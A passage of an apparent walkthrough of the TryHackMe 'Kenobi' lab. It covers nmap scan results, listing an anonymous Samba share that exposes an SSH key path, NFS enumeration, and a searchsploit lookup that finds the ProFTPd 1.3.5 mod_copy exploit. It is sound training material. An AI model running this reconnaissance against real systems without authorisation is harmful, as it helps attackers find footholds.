</span></span><span style=display:flex><span><span style=color:#ae81ff>2049</span><span style=color:#f92672>/</span>tcp  open  nfs_acl     syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>-</span><span style=color:#ae81ff>3</span> (RPC <span style=color:#75715e>#100227)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>39105</span><span style=color:#f92672>/</span>tcp open  mountd      syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>3</span> (RPC <span style=color:#75715e>#100005)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>44337</span><span style=color:#f92672>/</span>tcp open  nlockmgr    syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>4</span> (RPC <span style=color:#75715e>#100021)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>51941</span><span style=color:#f92672>/</span>tcp open  mountd      syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>3</span> (RPC <span style=color:#75715e>#100005)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>56481</span><span style=color:#f92672>/</span>tcp open  mountd      syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>3</span> (RPC <span style=color:#75715e>#100005)</span>
</span></span><span style=display:flex><span>Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:<span style=color:#f92672>/</span>o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> p2p<span style=color:#f92672>-</span>conficker: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Checking <span style=color:#66d9ef>for</span> Conficker<span style=color:#f92672>.</span>C <span style=color:#f92672>or</span> higher<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>1</span> (port <span style=color:#ae81ff>56068</span><span style=color:#f92672>/</span>tcp): CLEAN (Couldn<span style=color:#e6db74>&#39;t connect)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>2</span> (port <span style=color:#ae81ff>32401</span><span style=color:#f92672>/</span>tcp): CLEAN (Couldn<span style=color:#e6db74>&#39;t connect)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>3</span> (port <span style=color:#ae81ff>8514</span><span style=color:#f92672>/</span>udp): CLEAN (Failed to receive data)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Check <span style=color:#ae81ff>4</span> (port <span style=color:#ae81ff>35266</span><span style=color:#f92672>/</span>udp): CLEAN (Failed to receive data)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  <span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>4</span> checks are positive: Host <span style=color:#f92672>is</span> CLEAN <span style=color:#f92672>or</span> ports are blocked
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_clock<span style=color:#f92672>-</span>skew: mean: <span style=color:#ae81ff>1</span>h40m00s, deviation: <span style=color:#ae81ff>2</span>h53m12s, median: <span style=color:#ae81ff>0</span>s
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> nbstat: NetBIOS name: KENOBI, NetBIOS user: <span style=color:#f92672>&lt;</span>unknown<span style=color:#f92672>&gt;</span>, NetBIOS MAC: <span style=color:#ae81ff>000000000000</span> (Xerox)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Names:
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   KENOBI<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>00</span><span style=color:#f92672>&gt;</span>           Flags: <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   KENOBI<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>03</span><span style=color:#f92672>&gt;</span>           Flags: <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   KENOBI<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>20</span><span style=color:#f92672>&gt;</span>           Flags: <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   \x01\x02__MSBROWSE__\x02<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>01</span><span style=color:#f92672>&gt;</span>  Flags: <span style=color:#f92672>&lt;</span>group<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   WORKGROUP<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>00</span><span style=color:#f92672>&gt;</span>        Flags: <span style=color:#f92672>&lt;</span>group<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   WORKGROUP<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>1</span>d<span style=color:#f92672>&gt;</span>        Flags: <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   WORKGROUP<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>1</span>e<span style=color:#f92672>&gt;</span>        Flags: <span style=color:#f92672>&lt;</span>group<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Statistics:
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>0000000000000000000000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>0000000000000000000000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  <span style=color:#ae81ff>0000000000000000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb2<span style=color:#f92672>-</span>time: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   date: <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span>T23:<span style=color:#ae81ff>46</span>:<span style=color:#ae81ff>04</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  start_date: N<span style=color:#f92672>/</span>A
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb<span style=color:#f92672>-</span>os<span style=color:#f92672>-</span>discovery: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   OS: Windows <span style=color:#ae81ff>6.1</span> (Samba <span style=color:#ae81ff>4.3.11</span><span style=color:#f92672>-</span>Ubuntu)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Computer name: kenobi
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   NetBIOS computer name: KENOBI\x00
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Domain name: \x00
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   FQDN: kenobi
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  System time: <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span>T18:<span style=color:#ae81ff>46</span>:<span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span>:<span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb2<span style=color:#f92672>-</span>security<span style=color:#f92672>-</span>mode: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>311</span>: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_    Message signing enabled but <span style=color:#f92672>not</span> required
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb<span style=color:#f92672>-</span>security<span style=color:#f92672>-</span>mode: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   account_used: guest
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   authentication_level: user
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   challenge_response: supported
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  message_signing: disabled (dangerous, but default)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSE: Script Post<span style=color:#f92672>-</span>scanning<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>Read data files from: <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/../</span>share<span style=color:#f92672>/</span>nmap
</span></span><span style=display:flex><span>Service detection performed<span style=color:#f92672>.</span> Please report any incorrect results at https:<span style=color:#f92672>//</span>nmap<span style=color:#f92672>.</span>org<span style=color:#f92672>/</span>submit<span style=color:#f92672>/</span> <span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Nmap done: <span style=color:#ae81ff>1</span> IP address (<span style=color:#ae81ff>1</span> host up) scanned <span style=color:#f92672>in</span> <span style=color:#ae81ff>17.86</span> seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>15</span> (<span style=color:#ae81ff>636</span>B) <span style=color:#f92672>|</span> Rcvd: <span style=color:#ae81ff>12</span> (<span style=color:#ae81ff>524</span>B)
</span></span></code></pre></div><h1 id=enumeration>Enumeration
<a class=anchor href=#enumeration>#</a></h1><p>We can see that there is Samba file server running, so let&rsquo;s find the available shares.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> smbclient <span style=color:#f92672>-</span>L <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Password <span style=color:#66d9ef>for</span> [WORKGROUP\root]:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Sharename       Type      Comment
</span></span><span style=display:flex><span>        <span style=color:#f92672>---------</span>       <span style=color:#f92672>----</span>      <span style=color:#f92672>-------</span>
</span></span><span style=display:flex><span>        print<span style=color:#960050;background-color:#1e0010>$</span>          Disk      Printer Drivers
</span></span><span style=display:flex><span>        anonymous       Disk      
</span></span><span style=display:flex><span>        IPC<span style=color:#960050;background-color:#1e0010>$</span>            IPC       IPC Service (kenobi server (Samba, Ubuntu))
</span></span><span style=display:flex><span>Reconnecting <span style=color:#66d9ef>with</span> SMB1 <span style=color:#66d9ef>for</span> workgroup listing<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Server               Comment
</span></span><span style=display:flex><span>        <span style=color:#f92672>---------</span>            <span style=color:#f92672>-------</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Workgroup            Master
</span></span><span style=display:flex><span>        <span style=color:#f92672>---------</span>            <span style=color:#f92672>-------</span>
</span></span><span style=display:flex><span>        WORKGROUP            KENOBI
</span></span><span style=display:flex><span>root<span style=color:#a6e22e>@kali</span> <span style=color:#f92672>~/</span>tryhackme <span style=color:#ae81ff>6</span>s <span style=color:#960050;background-color:#1e0010>❯</span>
</span></span></code></pre></div><p>We will now try to connect to the anonymous share.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> smbclient \\\\<span style=color:#ae81ff>10.10.112.104</span>\\anonymous
</span></span><span style=display:flex><span>Password <span style=color:#66d9ef>for</span> [WORKGROUP\root]:
</span></span><span style=display:flex><span>Try <span style=color:#e6db74>&#34;help&#34;</span> to get a list of possible commands<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>smb: \<span style=color:#f92672>&gt;</span> ls
</span></span><span style=display:flex><span>  <span style=color:#f92672>.</span>                                   D        <span style=color:#ae81ff>0</span>  Wed Sep  <span style=color:#ae81ff>4</span> <span style=color:#ae81ff>06</span>:<span style=color:#ae81ff>49</span>:<span style=color:#ae81ff>09</span> <span style=color:#ae81ff>2019</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>..</span>                                  D        <span style=color:#ae81ff>0</span>  Wed Sep  <span style=color:#ae81ff>4</span> <span style=color:#ae81ff>06</span>:<span style=color:#ae81ff>56</span>:<span style=color:#ae81ff>07</span> <span style=color:#ae81ff>2019</span>
</span></span><span style=display:flex><span>  log<span style=color:#f92672>.</span>txt                             N    <span style=color:#ae81ff>12237</span>  Wed Sep  <span style=color:#ae81ff>4</span> <span style=color:#ae81ff>06</span>:<span style=color:#ae81ff>49</span>:<span style=color:#ae81ff>09</span> <span style=color:#ae81ff>2019</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#ae81ff>9204224</span> blocks of size <span style=color:#ae81ff>1024.</span> <span style=color:#ae81ff>6876708</span> blocks available
</span></span><span style=display:flex><span>smb: \<span style=color:#f92672>&gt;</span> get log<span style=color:#f92672>.</span>txt
</span></span><span style=display:flex><span>getting file \log<span style=color:#f92672>.</span>txt of size <span style=color:#ae81ff>12237</span> <span style=color:#66d9ef>as</span> log<span style=color:#f92672>.</span>txt (<span style=color:#ae81ff>25.4</span> KiloBytes<span style=color:#f92672>/</span>sec) (average <span style=color:#ae81ff>25.2</span> KiloBytes<span style=color:#f92672>/</span>sec)
</span></span><span style=display:flex><span>smb: \<span style=color:#f92672>&gt;</span> 
</span></span></code></pre></div><p>When we read the log.txt file, we can see the user is kenobi, the id_rsa file path and the ftp running on port 21.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>Generating public<span style=color:#f92672>/</span>private rsa key pair<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Enter file <span style=color:#f92672>in</span> which to save the key (<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>kenobi<span style=color:#f92672>/.</span>ssh<span style=color:#f92672>/</span>id_rsa): 
</span></span><span style=display:flex><span>Created directory <span style=color:#e6db74>&#39;/home/kenobi/.ssh&#39;</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Enter passphrase (empty <span style=color:#66d9ef>for</span> no passphrase): 
</span></span><span style=display:flex><span>Enter same passphrase again: 
</span></span><span style=display:flex><span>Your identification has been saved <span style=color:#f92672>in</span> <span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>kenobi<span style=color:#f92672>/.</span>ssh<span style=color:#f92672>/</span>id_rsa<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Your public key has been saved <span style=color:#f92672>in</span> <span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>kenobi<span style=color:#f92672>/.</span>ssh<span style=color:#f92672>/</span>id_rsa<span style=color:#f92672>.</span>pub<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>The key fingerprint <span style=color:#f92672>is</span>:
</span></span><span style=display:flex><span>SHA256:C17GWSl<span style=color:#f92672>/</span>v7KlUZrOwWxSyk<span style=color:#f92672>+</span>F7gYhVzsbfqkCIkr2d7Q kenobi<span style=color:#a6e22e>@kenobi</span>
</span></span><span style=display:flex><span>The key<span style=color:#e6db74>&#39;s randomart image is:</span>
</span></span><span style=display:flex><span><span style=color:#f92672>+---</span>[RSA <span style=color:#ae81ff>2048</span>]<span style=color:#f92672>----+</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>                 <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>           <span style=color:#f92672>..</span>    <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>        <span style=color:#f92672>.</span> o<span style=color:#f92672>.</span> <span style=color:#f92672>.</span>   <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>       <span style=color:#f92672>..=</span>o <span style=color:#f92672>+.</span>   <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>      <span style=color:#f92672>.</span> So<span style=color:#f92672>.</span>o<span style=color:#f92672>++</span>o<span style=color:#f92672>.</span> <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>  o <span style=color:#f92672>...+</span>oo<span style=color:#f92672>.</span>Bo<span style=color:#f92672>*</span>o  <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> o o <span style=color:#f92672>..</span>o<span style=color:#f92672>.</span>o<span style=color:#f92672>+.</span><span style=color:#a6e22e>@oo</span>  <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>  <span style=color:#f92672>.</span> <span style=color:#f92672>.</span> <span style=color:#f92672>.</span> E <span style=color:#f92672>.</span>O<span style=color:#f92672>+=</span> <span style=color:#f92672>.</span> <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>     <span style=color:#f92672>.</span> <span style=color:#f92672>.</span>   oBo<span style=color:#f92672>.</span>  <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>+----</span>[SHA256]<span style=color:#f92672>-----+</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># This is a basic ProFTPD configuration file (rename it to </span>
</span></span><span style=display:flex><span><span style=color:#75715e># &#39;proftpd.conf&#39; for actual use.  It establishes a single server</span>
</span></span><span style=display:flex><span><span style=color:#75715e># and a single anonymous login.  It assumes that you have a user/group</span>
</span></span><span style=display:flex><span><span style=color:#75715e># &#34;nobody&#34; and &#34;ftp&#34; for normal operation and anon.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ServerName			<span style=color:#e6db74>&#34;ProFTPD Default Installation&#34;</span>
</span></span><span style=display:flex><span>ServerType			standalone
</span></span><span style=display:flex><span>DefaultServer			on
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Port 21 is the standard FTP port.</span>
</span></span><span style=display:flex><span>Port				<span style=color:#ae81ff>21</span>
</span></span></code></pre></div><p>On the port 111 we see there is rpcbind service running and in the rpcinfo we can see that nfs service is running. So, let&rsquo;s enumerate for nfs shares and from the mount information we can see the mount /var.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nmap -p <span style=color:#ae81ff>111</span> -script<span style=color:#f92672>=</span>nfs-ls,nfs-statfs,nfs-showmount 10.10.112.104
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> nmap <span style=color:#f92672>-</span>p <span style=color:#ae81ff>111</span> <span style=color:#f92672>-</span>script<span style=color:#f92672>=</span>nfs<span style=color:#f92672>-</span>ls,nfs<span style=color:#f92672>-</span>statfs,nfs<span style=color:#f92672>-</span>showmount <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Starting Nmap <span style=color:#ae81ff>7.93</span> ( https:<span style=color:#f92672>//</span>nmap<span style=color:#f92672>.</span>org ) at <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>53</span> EDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>10.10.112.104</span>
</span></span><span style=display:flex><span>Host <span style=color:#f92672>is</span> up (<span style=color:#ae81ff>0.12</span>s latency)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE
</span></span><span style=display:flex><span><span style=color:#ae81ff>111</span><span style=color:#f92672>/</span>tcp open  rpcbind
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> nfs<span style=color:#f92672>-</span>showmount: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  <span style=color:#f92672>/</span>var <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> nfs<span style=color:#f92672>-</span>ls: Volume <span style=color:#f92672>/</span>var
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   access: Read Lookup NoModify NoExtend NoDelete NoExecute
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> PERMISSION  UID  GID  SIZE  TIME                 FILENAME
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x   <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>4096</span>  <span style=color:#ae81ff>2019</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span>T08:<span style=color:#ae81ff>53</span>:<span style=color:#ae81ff>24</span>  <span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x   <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>4096</span>  <span style=color:#ae81ff>2019</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span>T12:<span style=color:#ae81ff>27</span>:<span style=color:#ae81ff>33</span>  <span style=color:#f92672>..</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x   <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>4096</span>  <span style=color:#ae81ff>2019</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span>T12:<span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>49</span>  backups
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x   <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>4096</span>  <span style=color:#ae81ff>2019</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span>T10:<span style=color:#ae81ff>37</span>:<span style=color:#ae81ff>44</span>  cache
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rwxrwxrwt   <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>4096</span>  <span style=color:#ae81ff>2019</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span>T08:<span style=color:#ae81ff>43</span>:<span style=color:#ae81ff>56</span>  crash
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rwxrwsr<span style=color:#f92672>-</span>x   <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>50</span>   <span style=color:#ae81ff>4096</span>  <span style=color:#ae81ff>2016</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>12</span>T20:<span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>23</span>  local
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rwxrwxrwx   <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>9</span>     <span style=color:#ae81ff>2019</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span>T08:<span style=color:#ae81ff>41</span>:<span style=color:#ae81ff>33</span>  lock
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rwxrwxr<span style=color:#f92672>-</span>x   <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>108</span>  <span style=color:#ae81ff>4096</span>  <span style=color:#ae81ff>2019</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span>T10:<span style=color:#ae81ff>37</span>:<span style=color:#ae81ff>44</span>  log
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x   <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>4096</span>  <span style=color:#ae81ff>2019</span><span style=color:#f92672>-</span><span style=color:#ae81ff>01</span><span style=color:#f92672>-</span><span style=color:#ae81ff>29</span>T23:<span style=color:#ae81ff>27</span>:<span style=color:#ae81ff>41</span>  snap
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x   <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>4096</span>  <span style=color:#ae81ff>2019</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span>T08:<span style=color:#ae81ff>53</span>:<span style=color:#ae81ff>24</span>  www
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> nfs<span style=color:#f92672>-</span>statfs: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Filesystem  <span style=color:#ae81ff>1</span>K<span style=color:#f92672>-</span>blocks  Used       Available  Use<span style=color:#f92672>%</span>  Maxfilesize  Maxlink
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  <span style=color:#f92672>/</span>var        <span style=color:#ae81ff>9204224.0</span>  <span style=color:#ae81ff>1737356.0</span>  <span style=color:#ae81ff>6976272.0</span>  <span style=color:#ae81ff>20</span><span style=color:#f92672>%</span>   <span style=color:#ae81ff>16.0</span>T        <span style=color:#ae81ff>32000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap done: <span style=color:#ae81ff>1</span> IP address (<span style=color:#ae81ff>1</span> host up) scanned <span style=color:#f92672>in</span> <span style=color:#ae81ff>2.11</span> seconds
</span></span></code></pre></div><p>We saw there is a ftp service running on port 21. We found that the ftp version is 1.3.5.</p><p>We will use searchsploit to find for any vulnerabilities present in the 1.3.5 version of ProFTPd.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>searchsploit proftpd 1.3.5
</span></span></code></pre></div><p>While looking for the vulnerabilities for the proftpd version 1.3.5, we found that there is a vulnerability that exploits SITE CPFR/CPTO commands.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> searchsploit proftpd <span style=color:#ae81ff>1.3.5</span>
</span></span><span style=display:flex><span><span style=color:#f92672>---------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span style=color:#f92672>---------------------------------</span>
</span></span><span style=display:flex><span> Exploit Title                                                                                                                                           <span style=color:#f92672>|</span>  Path
</span></span><span style=display:flex><span><span style=color:#f92672>---------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span style=color:#f92672>---------------------------------</span>
</span></span><span style=display:flex><span>ProFTPd <span style=color:#ae81ff>1.3.5</span> <span style=color:#f92672>-</span> <span style=color:#e6db74>&#39;mod_copy&#39;</span> Command Execution (Metasploit)                                                                                                <span style=color:#f92672>|</span> linux<span style=color:#f92672>/</span>remote<span style=color:#f92672>/</span><span style=color:#ae81ff>37262.</span>rb
